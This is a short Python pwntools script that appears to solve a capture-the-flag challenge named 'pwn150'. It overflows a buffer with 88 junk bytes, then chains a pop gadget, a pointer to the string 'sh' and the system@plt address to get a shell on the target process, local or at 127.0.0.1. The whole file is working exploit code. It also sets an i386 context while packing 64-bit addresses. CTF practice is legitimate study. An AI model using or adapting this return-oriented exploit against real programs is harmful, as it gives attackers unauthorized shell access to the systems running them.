#!/usr/bin/env python
#TnMch
from pwn import *

context(arch='i386',os='linux')

local = True

if local: p = process("./pwn150")
else: p = remote("127.0.0.1", 5253)

binary = ELF("./pwn150")

print '[+] lets pwn'

system_addr = p64(0x40075f)     #  objdump -d pwn150| grep system -> system@plt
binsh_addr = p64(0x4003ef)      # ptr to "sh" | break main -> run -> find "sh"

buf = ""
buf += "A"*88                   # junk
buf += p64(0x00400883)  # http://ropshell.com/ropsearch?h=4a33feaf7ac08268b924f4cb8b5cafbe&p=pop
buf += binsh_addr
buf += system_addr
p.sendline(buf)
p.interactive()
